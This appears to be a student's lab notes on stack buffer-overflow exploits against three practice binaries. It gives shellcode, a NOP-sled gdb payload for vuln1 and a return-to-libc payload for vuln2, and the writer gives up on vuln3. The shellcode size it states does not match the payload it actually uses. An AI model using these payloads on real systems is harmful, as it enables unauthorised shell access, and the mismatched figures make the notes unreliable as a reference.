
vuln1:

start of the buffer -> 0xbffff1f0
268 bytes will cause segmfault

shellcode = "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80" <- all bytes less than x68 and greater than x6e

268 - 27(shell code size) =  241 bytes

inside gdb, run this line to perform the attack.
run $(python -c "print('\x90'* 241 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xf0\xf1\xff\xbf')") <- our attack, 241 nopsled, 27 bytes shell code, then the address of our buffer. 


vuln2:

start of the buffer -> 0xbffff1f4
264 bytes will cause segmfault

system addr: 0xb7e1c630

inside the gdb, run this line to perform the attack.
run $(python -c 'print("/bin/sh\x00" + "a" * 264 + "\x30\xc6\xe1\xb7" + "aaaa" + "\xf4\xf1\xff\xbf"') <- argument to the system + junk bytes to over flow the buffer + addr of the libc system + return addr which is junk in our case + the buffer start addr


vuln3: 

I gave up here. This is too complex for script kiddie like me. 





